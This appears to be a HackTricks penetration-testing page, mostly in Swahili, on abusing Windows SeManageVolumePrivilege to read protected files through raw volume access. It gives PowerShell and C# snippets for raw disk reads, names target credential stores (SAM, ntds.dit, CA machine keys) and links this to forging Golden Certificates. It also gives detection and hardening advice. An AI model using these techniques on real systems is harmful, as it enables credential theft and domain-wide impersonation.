# SeManageVolumePrivilege: Ufikiaji wa volumu ghafi kwa kusoma faili yoyote

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari

Windows user right: Kufanya kazi za matengenezo ya volumu (constant: SeManageVolumePrivilege).

Wanaomiliki wanaweza kufanya shughuli za chini za volumu kama defragmentation, kuunda/kuondoa volumu, na maintenance I/O. Muhimu kwa washambuliaji, haki hii inawezesha kufungua handles za kifaa cha volumu ghafi (mfano, \\.\C:) na kutoa I/O ya diski ya moja kwa moja inayoruka ACLs za faili za NTFS. Kwa ufikiaji ghafi unaweza kunakili bytes za faili yoyote kwenye volumu hata kama DACL inakataza, kwa kuchambua miundo ya filesystem nje ya mtandao au kutumia zana zinazosomea kwa ngazi ya block/cluster.

Chaguo-msingi: Administrators kwenye servers na domain controllers.

## Matukio ya matumizi mabaya

- Kusoma faili yoyote kwa kuruka ACLs kwa kusoma kifaa cha diski (mfano, kuhamisha nje nyenzo nyeti zilizo chini ya ulinzi wa mfumo kama machine private keys chini ya %ProgramData%\Microsoft\Crypto\RSA\MachineKeys na %ProgramData%\Microsoft\Crypto\Keys, registry hives, DPAPI masterkeys, SAM, ntds.dit kupitia VSS, n.k.).
- Kupitisha njia zilizofungwa/za kipaumbele (C:\Windows\System32\…) kwa kunakili bytes moja kwa moja kutoka kwenye kifaa ghafi.
- Katika mazingira ya AD CS, kuhamisha nje nyenzo za funguo za CA (machine key store) ili kutengeneza “Golden Certificates” na kujifanya mtu yeyote wa domain kupitia PKINIT. Angalia kiungo hapa chini.

Kumbuka: Bado unahitaji parser kwa miundo ya NTFS isipokuwa ukitegemea zana za msaada. Zana nyingi za sokoni tayari zimeficha ufikiaji ghafi.

## Mbinu za vitendo

- Open a raw volume handle and read clusters:

<details>
<summary>Bonyeza ili kupanua</summary>
```powershell
# PowerShell – read first MB from C: raw device (requires SeManageVolumePrivilege)
$fs = [System.IO.File]::Open("\\.\\C:",[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,[System.IO.FileShare]::ReadWrite)
$buf = New-Object byte[] (1MB)
$null = $fs.Read($buf,0,$buf.Length)
$fs.Close()
[IO.File]::WriteAllBytes("C:\\temp\\c_first_mb.bin", $buf)
```

```csharp
// C# (compile with Add-Type) – read an arbitrary offset of \\.\nusing System;
using System.IO;
class R {
static void Main(string[] a){
using(var fs = new FileStream("\\\\.\\C:", FileMode.Open, FileAccess.Read, FileShare.ReadWrite)){
fs.Position = 0x100000; // seek
var buf = new byte[4096];
fs.Read(buf,0,buf.Length);
File.WriteAllBytes("C:\\temp\\blk.bin", buf);
}
}
}
```
</details>

- Tumia chombo kinachojua NTFS kurejesha faili maalum kutoka kwenye volume ghafi:
- RawCopy/RawCopy64 (sector-level copy of in-use files)
- FTK Imager or The Sleuth Kit (read-only imaging, then carve files)
- vssadmin/diskshadow + shadow copy, then copy target file from the snapshot (if you can create VSS; often requires admin but commonly available to the same operators that hold SeManageVolumePrivilege)

Typical sensitive paths to target:
- %ProgramData%\Microsoft\Crypto\RSA\MachineKeys\
- %ProgramData%\Microsoft\Crypto\Keys\
- C:\Windows\System32\config\SAM, SYSTEM, SECURITY (local secrets)
- C:\Windows\NTDS\ntds.dit (domain controllers – via shadow copy)
- C:\Windows\System32\CertSrv\CertEnroll\ (CA certs/CRLs; private keys live in the machine key store above)

## AD CS Uunganisho: Forging a Golden Certificate

Ikiwa unaweza kusoma private key ya Enterprise CA kutoka kwenye machine key store, unaweza kutengeneza client‑auth certificates kwa principals yoyote na kujiathentisha kupitia PKINIT/Schannel. Hii mara nyingi huitwa Golden Certificate. Tazama:

{{#ref}}
../active-directory-methodology/ad-certificates/domain-persistence.md
{{#endref}}

(Sehemu: “Forging Certificates with Stolen CA Certificates (Golden Certificate) – DPERSIST1”).

## Ugunduzi na kuimarisha

- Punguza kwa nguvu ugawi wa SeManageVolumePrivilege (Perform volume maintenance tasks) kwa wasimamizi waliothibitishwa tu.
- Fuatilia Sensitive Privilege Use na ufunguzi wa process handle kwa device objects kama \\.\C:, \\.\PhysicalDrive0.
- Pendelea HSM/TPM-backed CA keys au DPAPI-NG ili kusoma faili ghafi kusiweze kurejesha nyenzo za funguo kwa namna zinazoweza kutumika.
- Weka njia za uploads, temp, na extraction zisizotekelezwa (non-executable) na zimetengwa (defense ya muktadha wa web ambayo mara nyingi huambatana na mnyororo huu baada ya post‑exploitation).

## Marejeo

- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege used to read CA key → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
